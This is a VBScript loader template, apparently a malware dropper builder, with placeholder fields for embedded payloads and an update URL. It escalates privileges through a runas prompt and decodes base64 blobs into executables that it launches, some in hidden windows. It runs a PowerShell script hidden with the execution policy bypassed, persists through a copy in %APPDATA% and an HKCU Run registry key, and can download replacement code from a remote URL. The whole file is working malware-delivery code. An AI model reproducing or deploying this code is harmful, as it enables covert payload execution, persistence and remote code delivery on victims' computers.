Dim bodyX
bodyX="0102"
Dim selfDel
selfDel="__selfDel"
Dim autostart
autostart="__autostart"
Dim autoupdate
autoupdate="__autoupdate"
Dim updateurl
updateurl="__updateurl"
Dim arrFrontData
arrFrontData = Array("__frontData")
Dim arrFrontName
arrFrontName = Array("__frontName")
Dim arrBackData
arrBackData = Array("__backData")
Dim arrBackName
arrBackName = Array("__backName")


If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If


Sub MainScriptLogic()
    For i = 0 To UBound(arrFrontName)
        data = arrFrontData(i)
        exe = GetFilePath(arrFrontName(i))
        DecodeBase64ToFile data, exe
        ExecuteFileAsync exe, False
    Next

    if Not FileExists(GetPS1FilePath) Then
        DecodeBase64ToFile bodyX, GetPS1FilePath
    end if

    Run

    if autostart = "True" Then
        DoSetAutoStart
    end if
    if autoupdate = "True" Then
        DoAutoUpdate
    end if

    For i = 0 To UBound(arrBackName)
        data = arrBackData(i)
        exe = GetFilePath(arrBackName(i))
        DecodeBase64ToFile data, exe
        ExecuteFileAsync exe, True
    Next
End Sub

Function GetFilePath(fileName)
    Dim fso, scriptPath, scriptFolder, fullPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    scriptPath = WScript.ScriptFullName
    scriptFolder = fso.GetParentFolderName(scriptPath)
    fullPath = fso.BuildPath(scriptFolder, fileName)
    Set fso = Nothing
    GetFilePath = fullPath
End Function

Function FileExists(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FileExists = fso.FileExists(filePath)
    Set fso = Nothing
End Function

Function GetPS1FilePath()
    Dim scriptPath, ps1Path
    scriptPath = WScript.ScriptFullName
    ps1Path = Left(scriptPath, Len(scriptPath) - 3) & "ps1"
    GetPS1FilePath = ps1Path
End Function

Function ExecuteFileAsync(filePath, hideWindow)
    Dim shell, result, windowStyle
    Set shell = CreateObject("WScript.Shell")
    If hideWindow Then
        windowStyle = 0 ' Hidden
    Else
        windowStyle = 1 ' Normal
    End If
    result = shell.Run(filePath, windowStyle, False)
    Set shell = Nothing
    ExecuteFileAsync = result
End Function

Sub Run
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
    shell.Run command, 0, True
end sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub

Sub DoSetAutoStart()
    Dim fso, shell, scriptPath, destFolder, destPath, registryKey
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
    CreateFolder fso, destFolder
    CopyScript fso, scriptPath, destPath
    SetAutoStart shell, destPath
    Set shell = Nothing
    Set fso = Nothing
End Sub

Sub CreateFolder(fso, folderPath)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder(folderPath)
    End If
End Sub

Sub CopyScript(fso, sourcePath, destinationPath)
    fso.CopyFile sourcePath, destinationPath, True
End Sub

Sub SetAutoStart(shell, scriptPath)
    Dim registryKey, registryValue, command
    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
    registryValue = "HefestAppVbs"
    command = "wscript.exe """ & scriptPath & """"
    shell.RegWrite registryKey & registryValue, command, "REG_SZ"
End Sub


Function DoAutoUpdate()
    Dim timeout, delay, startTime, response
    timeout = DateAdd("n", 1, Now)
    delay = 5
    startTime = Now

    Do While Now < timeout
        On Error Resume Next
        Set response = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        response.Open "GET", updateUrl, False
        response.Send
        
        If response.Status = 200 Then
            DecodeBase64ToFile response.responseText, GetPS1FilePath
            Exit Do
        End If
        On Error GoTo 0
        
        WScript.Sleep delay * 1000
    Loop
End Function




Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    ' Get the decoded binary data
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
    stream.Close
    
    ' Clean up
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function
